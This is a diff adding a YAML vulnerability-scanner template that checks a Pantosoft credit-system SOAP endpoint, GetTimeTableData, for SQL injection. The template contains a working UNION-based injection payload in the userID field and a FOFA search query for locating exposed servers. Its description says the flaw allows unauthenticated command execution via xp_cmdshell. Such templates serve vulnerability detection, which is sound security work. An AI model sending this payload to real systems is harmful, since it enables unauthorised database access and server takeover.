@@ -1,0 +1,38 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - 转换成数据类型 int 时失败
+        - status:
+            - 500
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /WebService/Interactive.asmx HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: text/xml;charset=UTF-8
+
+          <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+            <soapenv:Header/>
+            <soapenv:Body>
+              <tem:GetTimeTableData>
+                <!--type: string-->
+                <tem:userID>gero et' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(74)+CHAR(88)+CHAR(79)+CHAR(115)+CHAR(68)+CHAR(99)+CHAR(75)+CHAR(97)+CHAR(78)+CHAR(86)+CHAR(85)+CHAR(82)+CHAR(87)+CHAR(68)+CHAR(97)+CHAR(71)+CHAR(70)+CHAR(71)+CHAR(80)+CHAR(81)+CHAR(115)+CHAR(88)+CHAR(102)+CHAR(83)+CHAR(114)+CHAR(98)+CHAR(88)+CHAR(116)+CHAR(68)+CHAR(79)+CHAR(90)+CHAR(120)+CHAR(75)+CHAR(74)+CHAR(83)+CHAR(106)+CHAR(85)+CHAR(87)+CHAR(66)+CHAR(113)+CHAR(113)+CHAR(106)+CHAR(113)+CHAR(98)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Hene</tem:userID>
+                <!--type: string-->
+                <tem:startDate>sonoras imperio</tem:startDate>
+              </tem:GetTimeTableData>
+            </soapenv:Body>
+          </soapenv:Envelope>
+id: xuefenzhi-GetTimeTableData-sql-injection
+info:
+    author: Superhero
+    description: |-
+        fofa: body="www.pantosoft.com" && body="Pantosoft Corporation" || icon_hash="-1632820573"
+        学分制系统 GetTimeTableData 接口处存在SQL注入漏洞，未经身份验证的远程攻击者可利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
+    name: 学分制系统 GetTimeTableData SQL注入
+    reference:
+        - https://blog.csdn.net/m0_60571842/article/details/140069973
+    severity: high
+    tags: []
